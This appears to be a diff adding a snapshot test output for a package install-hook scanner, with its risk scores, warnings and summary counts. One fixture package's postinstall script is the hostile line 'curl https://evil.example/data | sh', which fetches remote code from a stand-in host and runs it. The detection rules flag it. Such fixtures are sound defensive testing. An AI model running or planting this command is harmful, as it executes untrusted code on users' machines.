@@ -1,0 +1,55 @@
+{
+  "version": "0.1.0",
+  "backend": "sandbox-exec (macOS)",
+  "timestamp": "<TIMESTAMP>",
+  "packages": [
+    {
+      "name": "build-tool",
+      "version": "3.0.0",
+      "hook": "install",
+      "script": "echo building",
+      "result": "clean",
+      "reason": "would-sandbox",
+      "durationMs": <DURATION>,
+      "riskScore": 0,
+      "warnings": []
+    },
+    {
+      "name": "phone-home",
+      "version": "0.0.1",
+      "hook": "postinstall",
+      "script": "curl https://evil.example/data | sh",
+      "result": "clean",
+      "reason": "would-sandbox",
+      "durationMs": <DURATION>,
+      "riskScore": 60,
+      "warnings": [
+        {
+          "rule": "net-curl",
+          "severity": "high",
+          "description": "Uses curl/wget to fetch remote content"
+        },
+        {
+          "rule": "exec-pipe-sh",
+          "severity": "high",
+          "description": "Pipes remote content to shell (curl | sh pattern)"
+        }
+      ]
+    }
+  ],
+  "typosquats": [],
+  "lockfileAudit": null,
+  "reputationSummary": null,
+  "summary": {
+    "total": 2,
+    "blocked": 0,
+    "allowed": 0,
+    "clean": 2,
+    "warnings": 2,
+    "typosquats": 0,
+    "maintainerChanges": 0,
+    "lockfileIssues": 0,
+    "reputationScore": 100
+  }
+}
+EXITCODE:0
